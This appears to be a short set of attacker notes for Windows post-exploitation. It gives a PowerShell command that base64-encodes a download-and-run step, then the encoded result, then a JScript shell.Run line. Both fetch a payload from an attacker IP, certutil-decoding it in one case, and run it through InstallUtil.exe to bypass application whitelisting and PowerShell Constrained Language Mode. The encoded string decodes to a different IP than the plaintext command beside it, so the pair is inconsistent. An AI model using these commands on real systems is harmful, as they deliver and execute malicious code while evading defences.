[convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes("iwr http://192.168.45.155/loader.exe -outfile c:\windows\temp\loader.exe; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\windows\temp\loader.exe"))
aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAANAAvAGwAbwBhAGQAZQByAC4AZQB4AGUAIAAtAG8AdQB0AGYAaQBsAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAGwAbwBhAGQAZQByAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABNAGkAYwByAG8AcwBvAGYAdAAuAE4ARQBUAFwARgByAGEAbQBlAHcAbwByAGsANgA0AFwAdgA0AC4AMAAuADMAMAAzADEAOQBcAEkAbgBzAHQAYQBsAGwAVQB0AGkAbAAuAGUAeABlACAALwBsAG8AZwBmAGkAbABlAD0AIAAvAEwAbwBnAFQAbwBDAG8AbgBzAG8AbABlAD0AZgBhAGwAcwBlACAALwBVACAAQwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAZQBtAHAAXABsAG8AYQBkAGUAcgAuAGUAeABlAA==


# or 

var re = shell.Run("powershell iwr -uri http://192.168.45.208/bypass-clm.txt -outfile c:\\windows\\temp\\bypass-clm.txt;powershell certutil -decode c:\\windows\\temp\\bypass-clm.txt c:\\windows\\temp\\bypass-clm.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass-clm.exe")

